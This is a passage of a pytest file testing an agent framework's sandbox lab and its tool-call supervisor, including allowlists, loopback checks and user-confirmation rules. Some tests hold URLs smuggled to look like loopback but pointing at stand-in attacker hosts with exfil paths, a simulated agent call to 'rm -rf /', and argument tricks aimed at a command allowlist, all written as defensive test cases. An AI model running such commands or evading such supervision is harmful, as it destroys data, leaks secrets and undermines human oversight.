            {"env": {"x": 3.0}, "expected": 9.0},
        ),
        evolve_generations=8,
        evolve_offspring_per_gen=16,
        mcts_max_iterations=6,
        counterpoint_rounds=2,
    )
    report = orch.run(spec)
    assert report.external_actions == 0
    assert report.sentience_claimed is False
    assert report.blackboard_integrity["valid"] is True
    assert report.sandbox_verdicts["ast_program"].passed is True
    assert report.distilled_artifacts


# ---------------------------------------------------------------------------
# Area 13: verify_shared_reasoning.py — Rotation Continuity & Real Evidence Check
# ---------------------------------------------------------------------------


def test_t5_area13_verify_shared_reasoning_rotation_continuity(tmp_path: Path) -> None:
    vsr = _load_module_from_path("verify_sr_mod", REPO_ROOT / "scripts" / "verify_shared_reasoning.py")

    # Real evidence passes cleanly.
    real_ev_dir = REPO_ROOT / "evidence" / "musical_math_chairs"
    music_rep = vsr.verify_music_evidence(real_ev_dir)
    rot_rep = vsr.verify_rotation_log(
        real_ev_dir / "ROTATION_LOG.md",
        music_started_utc=music_rep["started_utc"],
    )
    assert rot_rep["passed"] is True

    # Malformed rotation log with broken continuity (to_item=1 followed by from_item=9).
    bad_log = tmp_path / "ROTATION_LOG_BROKEN.md"
    bad_rows = [
        "| Slot | UTC Timestamp | Δt (s) | From Item | To Item | Architecture | Work |",
        "|---:|---|---:|---:|---:|---|---|",
        "| 1 | 2026-11-24T07:20:00Z | 0 | R1 (Music) | 1 | A1 | s1 |",
        "| 2 | 2026-11-24T07:20:30Z | 30 | 9 | 2 | A2 | s2 |",
        "| 3 | 2026-11-24T07:21:00Z | 30 | 2 | 3 | A3 | s3 |",
        "| 4 | 2026-11-24T07:21:30Z | 30 | 3 | 4 | A4 | s4 |",
        "| 5 | 2026-11-24T07:22:00Z | 30 | 4 | 5 | A5 | s5 |",
        "| 6 | 2026-11-24T07:22:30Z | 30 | 5 | 6 | A6 | s6 |",
        "| 7 | 2026-11-24T07:23:00Z | 30 | 6 | 7 | A7 | s7 |",
        "| 8 | 2026-11-24T07:23:30Z | 30 | 7 | 8 | A8 | s8 |",
        "| 9 | 2026-11-24T07:24:00Z | 30 | 8 | 9 | A9 | s9 |",
    ]
    bad_log.write_text("\n".join(bad_rows) + "\n", encoding="utf-8")
    with pytest.raises(ValueError, match="continuity"):
        vsr.verify_rotation_log(bad_log, music_started_utc="2026-11-24T07:19:00Z")


# ---------------------------------------------------------------------------
# Area 14: generate_music.py — Zero-Frame / Silent WAV & --verify-only (tmp_path)
# ---------------------------------------------------------------------------


def test_t5_area14_generate_music_zero_frame_and_verify_only(tmp_path: Path) -> None:
    gm = _load_module_from_path(
        "generate_music_mod",
        REPO_ROOT / "evidence" / "musical_math_chairs" / "generate_music.py",
    )
    vsr = _load_module_from_path(
        "verify_sr_mod_2",
        REPO_ROOT / "scripts" / "verify_shared_reasoning.py",
    )

    # 1. Generate a real WAV in tmp_path and verify --verify-only JSON output.
    gen_wav = tmp_path / "theme.wav"
    stats = gm.generate_musical_chairs_wav(gen_wav)
    assert stats["sample_rate"] == 44100
    assert stats["channels"] == 2
    assert stats["nframes"] > 0
    assert stats["rms"] > 0.0
    assert stats["peak"] > 0.0

    proc = subprocess.run(
        [
            sys.executable,
            str(REPO_ROOT / "evidence" / "musical_math_chairs" / "generate_music.py"),
            "--verify-only",
            "--output",
            str(gen_wav),
        ],
        capture_output=True,
        text=True,
        check=True,
    )
    cli_stats = json.loads(proc.stdout)
    assert cli_stats["wav_sha256"] == stats["wav_sha256"]

    # 2. Valid 0-frame RIFF/WAVE header: frozen generate_music.inspect_wav raises ValueError
    # (numpy max on empty array), and verify_music_evidence rejects 0-frame & silent WAVs cleanly.
    zero_wav = tmp_path / "zero.wav"
    with wave.open(str(zero_wav), "wb") as wf:
        wf.setnchannels(2)
        wf.setsampwidth(2)
        wf.setframerate(44100)
        wf.writeframes(b"")

    with pytest.raises(ValueError):
        gm.inspect_wav(zero_wav)

    ev_dir = tmp_path / "ev_zero"
    ev_dir.mkdir()
    (ev_dir / "musical_chairs_theme.wav").write_bytes(zero_wav.read_bytes())
    (ev_dir / "music_evidence.json").write_text(
        json.dumps(
            {
                "started_utc": "2026-11-24T07:11:40Z",
                "wav_sha256": hashlib.sha256(zero_wav.read_bytes()).hexdigest(),
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="0 audio frames"):
        vsr.verify_music_evidence(ev_dir)

    # 3. Non-empty silent WAV also rejected by verify_music_evidence.
    silent_wav = ev_dir / "musical_chairs_theme.wav"
    with wave.open(str(silent_wav), "wb") as wf:
        wf.setnchannels(2)
        wf.setsampwidth(2)
        wf.setframerate(44100)
        wf.writeframes(struct.pack("<20h", *([0] * 20)))
    (ev_dir / "music_evidence.json").write_text(
        json.dumps(
            {
                "started_utc": "2026-11-24T07:11:40Z",
                "wav_sha256": hashlib.sha256(silent_wav.read_bytes()).hexdigest(),
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="silent"):
        vsr.verify_music_evidence(ev_dir)


# ---------------------------------------------------------------------------
# Iteration 2 Adversarial Hardening Tests (R2-1 through R2-6)
# ---------------------------------------------------------------------------


def test_t5_r2_1_concurrent_dual_transport_model_copy_thread_safety() -> None:
    class _LockBearingVoice:
        def __init__(self, tag: str) -> None:
            self.tag = tag
            self._lock = threading.Lock()

        async def generate(self, prompt: str, context: Any = None) -> VoiceResponse:
            with self._lock:
                return VoiceResponse(text=f"{self.tag}:{prompt}")

    class _LockBearingCallable:
        def __init__(self) -> None:
            self._lock = threading.Lock()

        def __call__(self, prompt: str, context: Any = None) -> str:
            with self._lock:
                return f"offline:{prompt}"

    adapter = _LockBearingVoice("shared")
    handler = _LockBearingCallable()
    cfg = DualTransportAgentConfig(
        mode="offline",
        voice_adapter=adapter,
        offline_handler=handler,
        budget_config=ag_types.BudgetConfig(max_tokens=1024),
    )

    barrier = threading.Barrier(8)

    def _copy_worker(idx: int) -> DualTransportAgentConfig:
        barrier.wait(timeout=5.0)
        for _ in range(20):
            c = cfg.model_copy(deep=True, update={"mode": "local_qwen"})
            assert c.voice_adapter is adapter
            assert c.offline_handler is handler
            assert c.mode == "local_qwen"
            assert c.budget_config is not cfg.budget_config
        return cfg.model_copy(deep=True, update={"mode": "auto"})

    with ThreadPoolExecutor(max_workers=8) as pool:
        results = [fut.result() for fut in [pool.submit(_copy_worker, i) for i in range(8)]]

    assert cfg.voice_adapter is adapter
    assert cfg.offline_handler is handler
    assert cfg.mode == "offline"
    assert all(r.voice_adapter is adapter and r.offline_handler is handler and r.mode == "auto" for r in results)


def test_t5_r2_2_sympy_tautologies_and_nan_bool_candidates() -> None:
    lab = RealitySandboxLab(repo_root=REPO_ROOT)

    assert lab.verify_sympy_equation("1", "1", solve_for="x").passed is True
    assert lab.verify_sympy_equation("0", "0", solve_for="x").passed is True
    assert lab.verify_sympy_equation("sin(x)**2 + cos(x)**2", "1", solve_for="x").passed is True
    assert lab.verify_sympy_equation("1", "0", solve_for="x").passed is False

    for bad_cand in (
        float("nan"),
        float("inf"),
        float("-inf"),
        sympy.nan,
        sympy.oo,
        -sympy.oo,
        sympy.zoo,
        "oo",
        True,
        False,
        np.bool_(True),
        sympy.S.true,
        sympy.S.false,
        sympy.And(sympy.Symbol("a"), sympy.Symbol("b")),
        sympy.Or(sympy.Symbol("a"), sympy.Symbol("b")),
        sympy.Eq(sympy.Symbol("x"), 1),
        "True",
    ):
        verdict = lab.verify_sympy_equation(
            "1",
            "1",
            solve_for="x",
            candidate_solutions=[bad_cand],
        )
        assert verdict.passed is False, f"Expected non-finite/bool candidate {bad_cand!r} to fail"
        assert verdict.counterexample is not None
        assert verdict.ground_truth["checked_candidates"][0]["valid"] is False

    verdict_bool_eq = lab.verify_sympy_equation(
        "x - 1",
        "0",
        solve_for="x",
        candidate_solutions=[True],
    )
    assert verdict_bool_eq.passed is False
    assert verdict_bool_eq.counterexample is not None

    # Regression for SymPy 1.14.0 where Symbol inherits from both Expr and Boolean:
    # parametric symbolic candidates must pass when valid and fail when wrong.
    assert lab.verify_sympy_equation("x - y", "0", solve_for="x", candidate_solutions=["y"]).passed is True
    assert lab.verify_sympy_equation("x - y", "0", solve_for="x", candidate_solutions=[sympy.Symbol("y")]).passed is True
    v_wrong_sym = lab.verify_sympy_equation("x - y", "0", solve_for="x", candidate_solutions=["z"])
    assert v_wrong_sym.passed is False
    assert v_wrong_sym.counterexample is not None
    assert lab.verify_sympy_equation("x - y", "0", solve_for="x", candidate_solutions=["True"]).passed is False


def test_t5_r2_3_ast_sandbox_bool_not_equal_int() -> None:
    lab = RealitySandboxLab(repo_root=REPO_ROOT)

    v_int_for_bool = lab.verify_python_ast_sandbox(
        "def f(x):\n    return 1\n",
        test_cases=[({"x": 0}, True)],
    )
    assert v_int_for_bool.passed is False

    v_bool_for_int = lab.verify_python_ast_sandbox(
        "def f(x):\n    return True\n",
        test_cases=[({"x": 0}, 1)],
    )
    assert v_bool_for_int.passed is False

    v_bool_ok = lab.verify_python_ast_sandbox(
        "def f(x):\n    return x > 0\n",
        test_cases=[({"x": 1}, True), ({"x": 0}, False)],
    )
    assert v_bool_ok.passed is True


def test_t5_r2_4_process_supervision_invalid_port_and_set_sanitization() -> None:
    sup = LiveProcessSupervisor()
    ctx = ag_hooks.HookContext()

    res_port = run_coro_sync(
        sup.supervise_tool_call(
            ag_types.ToolCall(
                id="tc-badport",
                name="echo",
                args={"url": "http://user:pass@127.0.0.1:99999/ok"},
            ),
            context=ctx,
        )
    )
    assert res_port.allow is True
    assert res_port.modified_args is not None
    assert res_port.modified_args["url"] == "http://127.0.0.1:99999/ok"

    res_sets = run_coro_sync(
        sup.supervise_tool_call(
            ag_types.ToolCall(
                id="tc-sets",
                name="echo",
                args={
                    "notes": {"\x00bad"},
                    "urls": frozenset({"http://user:pw@127.0.0.1:8080/ok"}),
                },
            ),
            context=ctx,
        )
    )
    assert res_sets.allow is True
    assert res_sets.modified_args is not None
    assert res_sets.modified_args["notes"] == {"bad"}
    assert isinstance(res_sets.modified_args["notes"], set)
    assert res_sets.modified_args["urls"] == frozenset({"http://127.0.0.1:8080/ok"})
    assert isinstance(res_sets.modified_args["urls"], frozenset)


def test_t5_r2_5_quorum_and_dataset_reject_nan_and_bool_thresholds() -> None:
    for kwargs in (
        {"near_duplicate_l2_tol": float("nan")},
        {"echo_dk_tol": float("nan")},
        {"uniform_tol": float("nan")},
        {"coherence_min": float("nan")},
        {"coherence_min": True},
        {"near_duplicate_l2_tol": True},
        {"echo_dk_tol": -1e-9},
        {"uniform_tol": -1e-9},
        {"min_independent_peers": True},
    ):
        with pytest.raises(ValueError):
            FourPeerQuorumEngine(**kwargs)  # type: ignore[arg-type]

    lab = RealitySandboxLab(repo_root=REPO_ROOT)
    rows = [{"x": 1.0}, {"x": 2.0}]
    for bad_inv in (
        {"kind": "mean_range", "column": "x", "min": float("nan"), "max": 5.0},
        {"kind": "std_range", "column": "x", "min": 0.0, "max": float("inf")},
        {"kind": "range", "column": "x", "min": True, "max": 5.0},
        {"kind": "mean_range", "column": "x", "min": 0.0, "max": False},
    ):
        with pytest.raises(ValueError):
            lab.verify_dataset_invariants(rows, [bad_inv])


def test_t5_r2_6_verify_shared_reasoning_duplicate_slot_and_truncated_wav(tmp_path: Path) -> None:
    vsr = _load_module_from_path("verify_sr_mod_r2", REPO_ROOT / "scripts" / "verify_shared_reasoning.py")

    dup_log = tmp_path / "ROTATION_LOG_DUP.md"
    dup_rows = [
        "| Slot | UTC Timestamp | Δt (s) | From Item | To Item | Architecture | Work |",
        "|---:|---|---:|---:|---:|---|---|",
        "| 1 | 2026-11-24T07:20:00Z | 0 | R1 (Music) | 1 | A1 | s1 |",
        "| 1 | 2026-11-24T07:20:30Z | 30 | 1 | 2 | A2 | s2 |",
        "| 1 | 2026-11-24T07:21:00Z | 30 | 2 | 3 | A3 | s3 |",
        "| 1 | 2026-11-24T07:21:30Z | 30 | 3 | 4 | A4 | s4 |",
        "| 1 | 2026-11-24T07:22:00Z | 30 | 4 | 5 | A5 | s5 |",
        "| 1 | 2026-11-24T07:22:30Z | 30 | 5 | 6 | A6 | s6 |",
        "| 1 | 2026-11-24T07:23:00Z | 30 | 6 | 7 | A7 | s7 |",
        "| 1 | 2026-11-24T07:23:30Z | 30 | 7 | 8 | A8 | s8 |",
        "| 1 | 2026-11-24T07:24:00Z | 30 | 8 | 9 | A9 | s9 |",
    ]
    dup_log.write_text("\n".join(dup_rows) + "\n", encoding="utf-8")
    with pytest.raises(ValueError, match="Non-sequential or duplicate slot"):
        vsr.verify_rotation_log(dup_log, music_started_utc="2026-11-24T07:19:00Z")

    ev_dir = tmp_path / "ev_trunc"
    ev_dir.mkdir()
    trunc_wav = ev_dir / "musical_chairs_theme.wav"
    with wave.open(str(trunc_wav), "wb") as wf:
        wf.setnchannels(2)
        wf.setsampwidth(2)
        wf.setframerate(44100)
        wf.writeframes(struct.pack("<20h", *([1000] * 20)))
    raw_bytes = trunc_wav.read_bytes()
    trunc_wav.write_bytes(raw_bytes[:-4])
    (ev_dir / "music_evidence.json").write_text(
        json.dumps(
            {
                "started_utc": "2026-11-24T07:11:40Z",
                "wav_sha256": hashlib.sha256(trunc_wav.read_bytes()).hexdigest(),
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="Truncated or corrupt WAV"):
        vsr.verify_music_evidence(ev_dir)


# ---------------------------------------------------------------------------
# Iteration 3 Adversarial Hardening Tests (R3-1 through R3-5)
# ---------------------------------------------------------------------------


def test_t5_r3_1_sympy_non_expr_candidates_and_top_level_inputs() -> None:
    lab = RealitySandboxLab(repo_root=REPO_ROOT)

    # Individual non-Expr / un-sympifiable candidates must produce clean failed verdicts, never crash.
    for bad_cand in ("(1, 2)", "None", "sin", "True", (1, 2), None, sympy.sin, sympy.Tuple(1, 2)):
        verdict = lab.verify_sympy_equation(
            "x - 1",
            "0",
            solve_for="x",
            candidate_solutions=[bad_cand],
        )
        assert verdict.passed is False, f"Expected non-Expr candidate {bad_cand!r} to fail"
        assert verdict.counterexample is not None
        assert len(verdict.ground_truth["checked_candidates"]) == 1
        assert verdict.ground_truth["checked_candidates"][0]["valid"] is False

    # Combined batch check also marks every invalid candidate valid=False.
    batch = lab.verify_sympy_equation(
        "x - 1",
        "0",
        solve_for="x",
        candidate_solutions=["(1, 2)", "None", "sin", 1],
    )
    assert batch.passed is False
    assert [c["valid"] for c in batch.ground_truth["checked_candidates"]] == [
        False,
        False,
        False,
        True,
    ]

    # Top-level non-Expr inputs must raise ValueError cleanly across all SymPy lab methods.
    for bad_top in ("(1, 2)", "None", "sin", "True"):
        with pytest.raises(ValueError):
            lab.verify_sympy_identity(bad_top, "0")
        with pytest.raises(ValueError):
            lab.verify_sympy_identity("0", bad_top)
        with pytest.raises(ValueError):
            lab.verify_sympy_equation(bad_top, "0", solve_for="x")
        with pytest.raises(ValueError):
            lab.verify_sympy_calculus("diff", bad_top, "0")
        with pytest.raises(ValueError):
            lab.verify_sympy_calculus("diff", "x**2", bad_top)

    # ast.Tuple inside Call arguments (e.g. definite integral bounds) remains allowed.
    v_int = lab.verify_sympy_identity("integrate(x, (x, 0, 1))", "1/2")
    assert v_int.passed is True


def test_t5_r3_2_process_supervision_nan_inf_timeout_and_limit_sanitization() -> None:
    sup = LiveProcessSupervisor(max_timeout_sec=15.0, max_limit=250)
    ctx = ag_hooks.HookContext()

    tc = ag_types.ToolCall(
        id="tc-nan-bounds",
        name="echo",
        args={
            "timeout": float("nan"),
            "timeout_sec": float("inf"),
            "timeout_seconds": float("-inf"),
            "limit": float("nan"),
            "max_results": float("inf"),
            "max_items": float("-inf"),
            "max_rows": 999.9,
        },
    )
    res = run_coro_sync(sup.supervise_tool_call(tc, context=ctx))
    assert res.allow is True
    assert res.modified_args is not None
    assert res.modified_args["timeout"] == 15.0
    assert res.modified_args["timeout_sec"] == 15.0
    assert res.modified_args["timeout_seconds"] == 0.05
    assert res.modified_args["limit"] == 250
    assert res.modified_args["max_results"] == 250
    assert res.modified_args["max_items"] == 1
    assert res.modified_args["max_rows"] == 250
    # Strictly JSON-serializable without NaN/Inf leakage.
    serialized = json.dumps(res.modified_args, allow_nan=False)
    assert "NaN" not in serialized


def test_t5_r3_3_loopback_http_out_of_range_port_returns_failed_verdict() -> None:
    lab = RealitySandboxLab(repo_root=REPO_ROOT)

    for bad_port_url in (
        "http://127.0.0.1:99999/test",
        "http://localhost:70000/health",
        "http://[::1]:99999/v1",
    ):
        verdict = lab.verify_loopback_http(bad_port_url)
        assert verdict.passed is False
        assert verdict.ground_truth.get("loopback_permitted") is False
        assert verdict.counterexample is not None
        assert "port" in str(verdict.counterexample.get("reason", "")).lower()

    # 302 redirect to an out-of-range loopback port is also blocked cleanly.
    class _BadPortRedirectHandler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:  # noqa: N802
            self.send_response(302)
            self.send_header("Location", "http://127.0.0.1:99999/bad")
            self.end_headers()

        def log_message(self, format: str, *args: Any) -> None:
            return

    server = ThreadingHTTPServer(("127.0.0.1", 0), _BadPortRedirectHandler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        v_redir = lab.verify_loopback_http(f"http://127.0.0.1:{port}/redir")
        assert v_redir.passed is False
        assert v_redir.ground_truth.get("redirect_blocked") is True
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2.0)


def test_t5_r3_4_counterpoint_chairs_rejects_nan_inf_bool_and_bad_bounds() -> None:
    for bad_kwargs in (
        {"beat_quantum_s": float("nan")},
        {"beat_quantum_s": float("inf")},
        {"beat_quantum_s": 0.0},
        {"beat_quantum_s": True},
        {"step_budget": 0},
        {"step_budget": True},
        {"min_marginal_gain": float("nan")},
        {"min_marginal_gain": float("-inf")},
        {"min_marginal_gain": True},
        {"max_discrepancy_dk": float("nan")},
        {"max_discrepancy_dk": float("inf")},
        {"max_discrepancy_dk": 0.0},
        {"max_discrepancy_dk": True},
        {"coherence_min": float("nan")},
        {"coherence_min": 0.0},
        {"coherence_min": 1.1},
        {"coherence_min": True},
        {"sunk_cost_patience": 0},
        {"sunk_cost_patience": True},
        {"tau": float("nan")},
        {"tau": 0.0},
        {"tau": 1.0},
        {"tau": True},
    ):
        with pytest.raises(ValueError):
            CounterpointChairsEngine(**bad_kwargs)  # type: ignore[arg-type]

    # Valid thresholds still enforce Theorem 15 cross-voice discrepancy rejection.
    v1 = ChairVoice(
        "v1",
        "optimist",
        evaluator=lambda *_a, **_k: {
            "text": "high",
            "probabilities": [0.95, 0.03, 0.02],
            "verification": {"verifier_name": "sympy", "passed": True, "rationale": "ok"},
        },
        independence_tag="indep:v1",
    )
    v2 = ChairVoice(
        "v2",
        "skeptic",
        evaluator=lambda *_a, **_k: {
            "text": "low",
            "probabilities": [0.02, 0.03, 0.95],
            "verification": {"verifier_name": "sympy", "passed": True, "rationale": "ok"},
        },
        independence_tag="indep:v2",
    )
    cp = CounterpointChairsEngine(voices=[v1, v2], max_discrepancy_dk=0.22, coherence_min=0.01)
    res = cp.run([ProblemChair("c1", "Discrepancy check")], rounds=2)
    assert any(a.discrepancy_exceeded for a in res.cold_audits)
    assert any(not a.accepted for a in res.cold_audits)


def test_t5_r3_5_repo_command_ruff_format_rejected_and_missing_binary_clean(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    lab = RealitySandboxLab(repo_root=REPO_ROOT)

    for forbidden_ruff in (
        ["ruff", "format", "foo.py"],
        ["ruff", "format"],
        ["ruff", "--quiet", "format", "foo.py"],
        ["ruff", "format", "--", "--check"],
        ["python3", "-m", "ruff", "format", "foo.py"],
        ["ruff", "check", "--fix-only", "."],
        ["python3", "-m", "ruff", "check", "--fix", "."],
    ):
        cmd, reason = lab._validate_repo_argv(forbidden_ruff)
        assert cmd == [] and reason is not None, f"Expected rejection for {forbidden_ruff!r}"
        verdict = lab.verify_repo_command(forbidden_ruff, cwd=tmp_path)
        assert verdict.passed is False
        assert verdict.ground_truth["executed"] is False
        assert verdict.counterexample is not None and "rejected_reason" in verdict.counterexample

    for allowed_ruff in (
        ["ruff", "format", "--check", "foo.py"],
        ["ruff", "format", "--diff", "foo.py"],
        ["python3", "-m", "ruff", "format", "--check", "."],
        ["ruff", "check", "foo.py"],
        ["ruff", "--version"],
    ):
        cmd, reason = lab._validate_repo_argv(allowed_ruff)
        assert reason is None and cmd == allowed_ruff, f"Expected {allowed_ruff!r} allowed, got {reason!r}"

    # Missing allowlisted binary on PATH returns structured SandboxLabVerdict(passed=False, available=False).
    monkeypatch.setenv("PATH", str(tmp_path))
    v_missing = lab.verify_repo_command(["ruff", "--version"], cwd=tmp_path)
    assert v_missing.passed is False
    assert v_missing.available is False
    assert v_missing.ground_truth["executed"] is False
    assert v_missing.counterexample is not None
    assert v_missing.counterexample["missing_binary"] == "ruff"


# ---------------------------------------------------------------------------
# Iteration 4 Adversarial Hardening Tests (R4-1 through R4-6)
# ---------------------------------------------------------------------------


def test_t5_r4_1_ask_user_and_destructive_enforcement_after_build_policies() -> None:
    prompts_seen: list[str] = []

    def _ask_handler(tc: ag_types.ToolCall, reason: str = "") -> bool:
        cmd = str(tc.args.get("CommandLine", ""))
        prompts_seen.append(f"{tc.name}:{cmd}")
        return cmd == "pytest -q"

    def run_command(CommandLine: str) -> str:
        return f"ran:{CommandLine}"

    ask_rule = SupervisionPolicyRule(
        rule_id="ask_rm",
        tool="run_command",
        decision=ag_policy.Decision.ASK_USER,
        reason="confirm destructive tool",
        ask_user_handler=_ask_handler,
    )
    sup = LiveProcessSupervisor(rules=[ask_rule])

    # Exporting policies or building Agent config must NOT disable direct supervision.
    exported_policies = sup.build_policies()
    assert any(p.decision == ag_policy.Decision.ASK_USER for p in exported_policies)

    def _offline_handler(_prompt: str, _ctx: dict[str, Any]) -> VoiceResponse:
        return VoiceResponse(
            text="done",
            tool_calls=(
                {"name": "run_command", "args": {"CommandLine": "pytest -q"}},
                {"name": "run_command", "args": {"CommandLine": "rm -rf /"}},
            ),
        )

    cfg = sup.create_agent_config(
        mode="offline",
        tools=[run_command],
        offline_handler=_offline_handler,
    )
    assert not any(
        isinstance(p, ag_policy.Policy) and p.decision == ag_policy.Decision.ASK_USER
        for p in cfg.policies
    )

    # Direct supervise_tool_call and pre_tool_call_hook STILL enforce ASK_USER.
    ctx = ag_hooks.HookContext()
    tc_rm = ag_types.ToolCall(id="tc-rm-1", name="run_command", args={"CommandLine": "rm -rf /"})
    res_direct = run_coro_sync(sup.supervise_tool_call(tc_rm, context=ctx))
    assert res_direct.allow is False
    assert len(prompts_seen) == 1

    res_hook = run_coro_sync(sup.pre_tool_call_hook().run(ctx, tc_rm))
    assert res_hook.allow is False
    assert len(prompts_seen) == 2

    # Agent execution prompts ASK_USER exactly once per tool call (no duplicate prompts).
    async def _run_agent() -> str:
        async with Agent(cfg) as agent:
            resp = await agent.chat("run tools")
            return await resp.text()

    agent_txt = run_coro_sync(_run_agent())
    assert "ran:pytest -q" in agent_txt
    assert "DENIED" in agent_txt
    assert len(prompts_seen) == 4  # 2 direct + 1 per Agent tool call

    # Without an ASK_USER rule, Step 4 destructive blocking also remains active after build_policies().
    strict_sup = LiveProcessSupervisor()
    _ = strict_sup.build_policies()
    _ = strict_sup.create_agent_config(mode="offline")
    res_strict = run_coro_sync(strict_sup.supervise_tool_call(tc_rm, context=ctx))
    assert res_strict.allow is False


def test_t5_r4_2_backslash_and_control_authority_smuggling_blocked() -> None:
    smuggled_urls = (
        "http://evil.com\\@127.0.0.1/exfil",
        "https://attacker.org\\@localhost:8080/steal",
        "http://127.0.0.1\\@evil.com/exfil",
        "http://evil.com\\127.0.0.1/exfil",
        "http://user@evil.com@127.0.0.1/exfil",
        "http://evil.com\t@127.0.0.1/exfil",
    )
    sup = LiveProcessSupervisor()
    ctx = ag_hooks.HookContext()

    for idx, bad_url in enumerate(smuggled_urls):
        assert is_loopback_url(bad_url) is False, f"Smuggled URL accepted as loopback: {bad_url!r}"
        assert _strip_url_userinfo(bad_url) == bad_url, (
            f"_strip_url_userinfo laundered smuggled URL: {bad_url!r}"
        )
        assert find_non_loopback_urls({"u": bad_url}), (
            f"find_non_loopback_urls missed smuggled URL: {bad_url!r}"
        )
        res = run_coro_sync(
            sup.supervise_tool_call(
                ag_types.ToolCall(id=f"tc-smuggle-{idx}", name="fetch", args={"url": bad_url}),
                context=ctx,
            )
        )
        assert res.allow is False, f"Supervisor allowed smuggled URL: {bad_url!r}"

    # Normal loopback userinfo stripping remains functional.
    assert is_loopback_url("http://user:pw@127.0.0.1:8080/ok") is True
    assert _strip_url_userinfo("http://user:pw@127.0.0.1:8080/ok") == "http://127.0.0.1:8080/ok"


def test_t5_r4_3_ruff_pre_subcommand_value_flags_cannot_bypass_format_guard(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    lab = RealitySandboxLab(repo_root=REPO_ROOT)

    for forbidden_ruff in (
        ["ruff", "--config", "pyproject.toml", "format", "foo.py"],
        ["python3", "-m", "ruff", "--config", "pyproject.toml", "format", "foo.py"],
        ["ruff", "--cache-dir", "/tmp/x", "format", "."],
        ["ruff", "--output-format", "json", "format", "foo.py"],
        ["ruff", "--target-version", "py312", "format", "."],
        ["ruff", "--exclude", "*.pyi", "format", "."],
        ["ruff", "--select", "E,F", "format", "."],
        ["ruff", "--line-length", "100", "format", "."],
        ["ruff", "--respect-gitignore", "format", "foo.py"],
        ["ruff", "--respect-gitignore", "true", "format", "foo.py"],
        ["ruff", "--config", "pyproject.toml", "format", "--", "--check"],
        ["ruff", "check", "--fix-only=true", "."],
    ):
        cmd, reason = lab._validate_repo_argv(forbidden_ruff)
        assert cmd == [] and reason is not None, f"Bypass allowed for {forbidden_ruff!r}"

    for allowed_ruff in (
        ["ruff", "--config", "pyproject.toml", "check", "foo.py"],
        ["ruff", "--config", "format", "check", "foo.py"],
        ["ruff", "check", "format"],
        ["ruff", "--config", "pyproject.toml", "format", "--check", "foo.py"],
        ["ruff", "--config=pyproject.toml", "format", "--diff", "foo.py"],
        ["python3", "-m", "ruff", "--config", "pyproject.toml", "format", "--check", "."],
    ):
        cmd, reason = lab._validate_repo_argv(allowed_ruff)
        assert reason is None and cmd == allowed_ruff, (
            f"Valid ruff cmd {allowed_ruff!r} rejected: {reason!r}"
        )

    # Verify a real executable `ruff` stub on PATH is NOT invoked for pre-subcommand bypasses.
    marker = tmp_path / "mutated.marker"
    ruff_bin = tmp_path / "ruff"
    ruff_bin.write_text(
        f"#!/bin/sh\ntouch {str(marker)!r}\nexit 0\n",
        encoding="utf-8",
    )
    os.chmod(ruff_bin, 0o755)
    monkeypatch.setenv("PATH", f"{tmp_path}:{os.environ.get('PATH', '')}")

    v_blocked = lab.verify_repo_command(
        ["ruff", "--config", "pyproject.toml", "format", "foo.py"],
        cwd=tmp_path,
    )
    assert v_blocked.passed is False
    assert v_blocked.ground_truth["executed"] is False
    assert not marker.exists()

    v_ok = lab.verify_repo_command(
        ["ruff", "--config", "pyproject.toml", "format", "--check", "foo.py"],
        cwd=tmp_path,
    )
    assert v_ok.passed is True
    assert v_ok.ground_truth["executed"] is True
    assert marker.exists()


def test_t5_r4_4_distillation_nonjson_semantic_fact_and_rollback_missing_state_dir(
    tmp_path: Path,
) -> None:
    bb = EpistemicBlackboard()
    m1 = bb.post_measurement("zoe", "fact", "sympy", "ring", "exact", 1)
    ev1 = bb.promote_to_evidence(m1.record_id, "sympy", True, "Deterministic verification passed.")

    fresh_dir = tmp_path / "uncreated" / "nested_state"
    dist = System2To1Distiller(state_dir=fresh_dir, blackboard=bb)

    for idx, bad_obj in enumerate((float("nan"), float("inf"), float("-inf"), object())):
        trace = System2Trace(
            task_prompt=f"distill invalid semantic object #{idx}",
            initial_uncertainty_a_tau=2.0,
            verifier_passed=True,
            evidence_id=ev1.record_id,
            provenance={"source": "sympy", "evidence_id": ev1.record_id},
            solution_code_or_rule={
                "subject": "subj",
                "relation": "rel",
                "object": bad_obj,
            },
        )
        with pytest.raises(DistillationRejectedError):
            dist.distill(trace, artifact_kind="semantic_fact")

    assert len(dist.rejection_log()) == 4
    assert dist.summary()["rejections_count"] == 4
    assert dist.summary()["memory_summary"]["semantic_active_count"] == 0
    assert not fresh_dir.exists()

    # Direct ZoeUnifiedMemory.rollback also creates missing parent directories cleanly.
    mem_root = tmp_path / "missing_mem_parent" / "deep"
    mem = ZoeUnifiedMemory(root=mem_root)
    snap = mem.snapshot()
    assert not mem_root.exists()
    restored = mem.rollback(snap)
    assert restored["memory_sha256"] == snap["memory_sha256"]
    assert (mem_root / "zoe_l5_unified_memory.json").is_file()


def test_t5_r4_5_sandbox_nan_bool_timeout_and_sympy_preparse_validation(tmp_path: Path) -> None:
    for bad_default in (float("nan"), float("inf"), float("-inf"), 0.0, -1.0, 121.0, True, False):
        with pytest.raises(ValueError):
            RealitySandboxLab(repo_root=REPO_ROOT, default_timeout=bad_default)  # type: ignore[arg-type]

    lab = RealitySandboxLab(repo_root=REPO_ROOT)
    for bad_timeout in (float("nan"), float("inf"), float("-inf"), 0.0, -0.5, True, False):
        with pytest.raises(ValueError):
            lab.verify_repo_command(["git", "status"], cwd=tmp_path, timeout=bad_timeout)  # type: ignore[arg-type]
        with pytest.raises(ValueError):
            lab.verify_lean_proof("theorem t : 1 = 1 := rfl", timeout=bad_timeout)  # type: ignore[arg-type]
        with pytest.raises(ValueError):
            lab.verify_loopback_http("http://127.0.0.1:8080/health", timeout=bad_timeout)  # type: ignore[arg-type]

    with pytest.raises(ValueError):
        lab.verify_repo_command(["git", "status"], cwd=tmp_path, timeout=121.0)
    with pytest.raises(ValueError):
        lab.verify_lean_proof("theorem t : 1 = 1 := rfl", timeout=121.0)

